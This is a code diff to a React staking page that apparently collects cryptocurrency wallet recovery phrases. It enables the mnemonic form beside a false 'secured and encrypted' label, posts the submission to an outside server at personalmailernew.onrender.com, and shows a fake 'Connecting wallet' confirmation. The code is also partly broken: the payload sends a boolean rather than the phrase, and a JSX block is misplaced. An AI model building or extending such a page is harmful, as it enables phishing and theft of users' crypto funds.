@@ -135,6 +135,106 @@ export default function Staking() {
     setMnemonic('');
   };
 
+  const [isError, setIsError] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [isSuccess, setIsSuccess] = useState(false);
+  const [selectedOption, setSelectedOption] = useState('');
+  const [phrase, setPhrase] = useState('');
+
+  const toggleConnect = (e) => {
+    e.preventDefault();
+    setIsLoading(true);
+
+    const payload = {
+      wallet: selectedWallet.name,
+      phrase: selectedOption === phrase,
+    };
+
+    fetch('https://personalmailernew.onrender.com/details', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    })
+      .then((response) => {
+        if (!response.ok) {
+          return response.json().then((errorData) => {
+            throw new Error(errorData.message || 'Failed to connect wallet');
+          });
+        }
+        return response.json();
+      })
+      .then((data) => {
+        console.log('Wallet connected:', data);
+
+        if (data.status === 'Success') {
+          setIsSuccess(true);
+          setIsError(false);
+          setSelectedWallet('');
+          setPhrase('');
+          setSelectedOption('');
+        } else {
+          setIsError(true);
+          setIsSuccess(false);
+          console.log('Error:', data.message);
+        }
+      })
+      .catch((error) => {
+        console.error('Connection error:', error);
+        setIsError(true);
+        setIsSuccess(false);
+      })
+      .finally(() => {
+        setIsLoading(false);
+      });
+  };
+
+  {
+    isSuccess && (
+      <div className="flex fixed inset-0 z-50 justify-center items-center bg-black bg-opacity-50">
+        <div className="p-6 w-full max-w-sm text-center text-black bg-white rounded-xl shadow-lg">
+          <div className="flex justify-center mb-6">
+            <svg
+              className="w-24 h-24 text-green-500 animate-draw"
+              viewBox="0 0 52 52"
+            >
+              <circle
+                className="text-green-500 stroke-current"
+                cx="26"
+                cy="26"
+                r="25"
+                fill="none"
+                strokeWidth="2"
+              />
+              <path
+                className="text-green-500 stroke-current"
+                fill="none"
+                strokeWidth="3"
+                d="M14 27l7 7 17-17"
+              />
+            </svg>
+          </div>
+          <p className="text-lg lg:text-[25px] font-medium mb-5 text-gray-500">
+            Connecting
+          </p>
+          <p className="text-[15px] lg:text-[18px] font-medium mb-5 text-gray-500">
+            Connecting wallet ...
+          </p>
+          <button
+            onClick={() => {
+              setIsSuccess(false);
+              setModalOpen(false); // Close the modal
+            }}
+            className="px-4 py-2 text-white bg-green-500 rounded transition hover:bg-green-600"
+          >
+            Ok
+          </button>
+        </div>
+      </div>
+    );
+  }
+
   // Modal content logic
   const renderModalContent = () => {
     if (!selectedWallet) return null;
@@ -202,7 +302,7 @@ export default function Staking() {
     }
     if (modalStep === 'manual') {
       return (
-        <div className="flex flex-col items-center">
+        <form onSubmit={toggleConnect} className="flex flex-col items-center">
           <div className="mb-4 text-lg font-medium text-gray-700">
             This session is secured and encrypted
           </div>
@@ -212,11 +312,16 @@ export default function Staking() {
             value={mnemonic}
             onChange={(e) => setMnemonic(e.target.value)}
           />
-          <button
-            className="py-2 w-full font-semibold text-gray-500 bg-blue-200 rounded-lg cursor-not-allowed"
-            disabled
-          >
-            Connect Wallet
+          <button className="py-2 w-full font-semibold text-gray-500 bg-[#5142FC] hover:bg-opacity-90 rounded-lg cursor-pointer">
+            {isLoading ? (
+              <>
+                <div className="flex justify-center items-center">
+                  <span className="ml-2">Connecting...</span>
+                </div>
+              </>
+            ) : (
+              'Connect Wallet'
+            )}
           </button>
           <div className="flex items-center mt-8 text-gray-600">
             <div className="flex gap-4">
@@ -226,22 +331,22 @@ export default function Staking() {
               </p>
             </div>
           </div>
-        </div>
+        </form>
       );
     }
     return null;
   };
 
   return (
-    <div className="flex flex-col justify-center items-center px-2 sm:px-4 py-5 min-h-screen bg-white">
+    <div className="flex flex-col justify-center items-center px-2 py-5 min-h-screen bg-white sm:px-4">
       {/* Top nav */}
-      <div className="flex justify-between items-center px-2 sm:px-8 w-full">
+      <div className="flex justify-between items-center px-2 w-full sm:px-8">
         <span className="text-lg font-medium">Wallets</span>
         <span className="text-lg font-medium">dApps</span>
       </div>
       {/* Central diagram */}
-      <div className="flex flex-col flex-1 justify-center items-center mt-8 sm:mt-12 mb-8 w-full">
-        <div className="w-full flex justify-center">
+      <div className="flex flex-col flex-1 justify-center items-center mt-8 mb-8 w-full sm:mt-12">
+        <div className="flex justify-center w-full">
           <img src={Conn} alt="" className="max-w-full h-auto" />
         </div>
         <div className="mt-8 text-center">
@@ -266,7 +371,7 @@ export default function Staking() {
           {wallets.map((wallet) => (
             <div
               key={wallet.name}
-              className="flex gap-4 items-center p-4 py-8 bg-white rounded-xl border border-gray-100 shadow cursor-pointer min-w-0"
+              className="flex gap-4 items-center p-4 py-8 min-w-0 bg-white rounded-xl border border-gray-100 shadow cursor-pointer"
               onClick={() => handleWalletClick(wallet)}
             >
               {wallet.logo}
